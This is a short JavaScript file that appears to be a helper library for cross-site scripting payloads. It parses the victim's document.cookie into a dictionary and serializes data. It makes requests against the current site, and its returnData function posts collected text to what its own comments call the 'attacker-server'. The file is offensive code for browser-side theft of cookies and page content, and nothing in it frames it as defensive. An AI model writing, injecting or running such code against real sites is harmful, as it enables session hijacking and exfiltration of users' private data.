

// Read cookie and return as a dictionary
function get_cookies()	{
	var ret = {};
	var cookies = document.cookie.split(";");
	for(var i = 0; i < cookies.length; i++)	{
		var cookie = cookies[i].trim();
		var vals = cookie.split("=");
		ret[vals[0]] = vals[1];
	}
	return ret;
}

// Get cookie value based on name
function get_cookie(name)	{
	var cookies = get_cookies();
	return cookies[name];
}

// Serialize cookie value from dictionary to URL-encoded pairs
function serialize(data)	{
	var strs = []
	for(var k in data)	{
		strs.push(encodeURIComponent(k) + "=" + encodeURIComponent(data[k]))
	}
	return strs.join("&")
}


// Send a request to the server and return the content back to attacker-server
function sendRequest(request, headers, params, cb)	{
	var xhr = new XMLHttpRequest();
	xhr.open(request["method"], request["target"] + request["resource"], true);

	for (var key in headers)	{
		xhr.setRequestHeader(key, headers[key]);
	}

	xhr.onreadystatechange = function() {
	    if(xhr.readyState == 4 && xhr.status == 200) {
	        cb(xhr.responseText);
	    }
	}
	xhr.send(params);
}



// Return data to attacker-server
// TODO: Perform error checking and log to server
function returnData(text)	{
	var xhr = new XMLHttpRequest();
	xhr.open(returnPath["method"], returnPath["target"] + returnPath["resource"], true);
	xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
	xhr.onreadystatechange = function() {
	    if(xhr.readyState == 4 && xhr.status == 200) {
	        console.log(xhr.responseText);
	    }
	}

	// Send as URL-encoded
	xhr.send("data=" + encodeURIComponent(text));

}

// Get current target in the form of:
// - https://example.com
function target_URL()	{
	var l = window.location.toString();
	var p = window.location.pathname.toString();
	var s = l.search(p);
	return l.substring(0,s);
}


